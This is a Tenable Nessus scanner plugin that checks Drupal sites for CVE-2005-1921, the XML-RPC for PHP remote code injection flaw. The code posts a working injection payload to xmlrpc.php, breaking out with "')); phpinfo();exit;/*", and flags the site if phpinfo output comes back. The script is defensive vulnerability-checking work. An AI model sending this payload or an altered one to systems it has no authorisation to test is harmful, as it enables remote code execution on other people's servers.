#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(18640);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_cve_id("CVE-2005-1921");
  script_bugtraq_id(14088);
  script_osvdb_id(17793);

  script_name(english:"Drupal XML-RPC for PHP Remote Code Injection");
  script_summary(english:"Checks for XML-RPC for PHP remote code injection vulnerability in Drupal.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an arbitrary PHP code injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Drupal running on the remote web server allows
attackers to execute arbitrary PHP code due to a flaw in its bundled
XML-RPC library.");
  script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00088-07022005");
  script_set_attribute(attribute:"see_also", value:"https://www.drupal.org/drupal-4.6.2");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Drupal version 4.5.4 / 4.6.2 or later or remove the
'xmlrpc.php' script." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'PHP XML-RPC Arbitrary Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/06/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/06/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/07/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pear:xml_rpc");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Drupal", "www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Drupal";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
base_url = build_url(qs:dir+'/', port:port);

# Check whether the script exists.
r = http_send_recv3(port: port, method: "GET", item:dir+'/xmlrpc.php', exit_on_fail:TRUE);

# If it does...
if ("<methodResponse>" >< r[2])
{
  # Try to exploit it to run phpinfo().
  postdata =
    '<?xml version="1.0"?>' +
    "<methodCall>" +
    "<methodName>test.method</methodName>" +
      "<params>" +
        "<param><value><name>','')); phpinfo();exit;/*</name></value></param>"+
      "</params>" +
    "</methodCall>";

  r = http_send_recv3(
    port:port,
    method: "POST",
    item: dir + "/xmlrpc.php",
    content_type: "text/xml",
    data: postdata,
    exit_on_fail:TRUE
  );

  # There's a problem if it looks like the output of phpinfo().
  if ("PHP Version" >< r[2])
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      generic     : TRUE,
      request     : make_list(http_last_sent_request()),
      output      : chomp(r[2])
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, base_url);
